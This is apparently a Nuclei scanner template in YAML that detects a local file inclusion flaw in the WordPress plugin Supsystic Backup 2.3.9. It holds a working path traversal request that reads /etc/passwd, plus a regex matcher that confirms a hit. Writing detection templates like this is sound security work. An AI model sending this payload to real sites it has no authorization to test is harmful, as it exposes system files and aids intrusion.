id: wp-supsystic-backup-lfi

info:
  name: WordPress Plugin Supsystic Backup 2.3.9 - Local File Inclusion
  author: daffainfo
  severity: high
  reference: https://www.exploit-db.com/exploits/49545
  tags: wordpress,wp-plugin,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=supsystic-backup&tab=bupLog&download=../../../../../../../../../etc/passwd"

    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
